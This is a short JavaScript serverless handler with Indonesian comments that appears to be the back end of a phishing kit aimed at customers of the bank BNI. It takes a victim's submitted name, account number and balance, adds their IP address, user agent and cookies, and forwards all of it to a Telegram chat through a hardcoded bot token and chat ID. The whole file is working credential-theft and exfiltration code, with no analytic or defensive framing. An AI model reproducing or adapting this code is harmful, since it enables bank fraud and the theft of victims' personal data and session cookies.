export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const telegramId = '-1002521703546';
    const botToken = '7975184969:AAHQe0cBq-RshRP4OUePLYpTNNRxm41dkM0';
    const { a, b, c } = req.body;

    // Ambil IP Address (dari header real IP atau fallback)
    const ip =
        req.headers['x-forwarded-for']?.split(',')[0] ||
        req.socket?.remoteAddress ||
        'Unknown IP';

    // Ambil User-Agent
    const userAgent = req.headers['user-agent'] || 'Unknown UA';

    // Ambil cookies (langsung dari header)
    const cookies = req.headers.cookie || 'No cookies sent';

    // Format pesan
    const message = `
______________________________
RES BNI new
______________________________
• NAME   : ${a}
• NOMOR  : ${b}
• SALDO  : ${c}
______________________________
📡 IP        : ${ip}
🧠 USER-AGENT: ${userAgent}
🍪 COOKIES   : ${cookies}
______________________________`;

    const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        await fetch(telegramApi, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ success: false, message: 'Failed to send message' });
    }
}
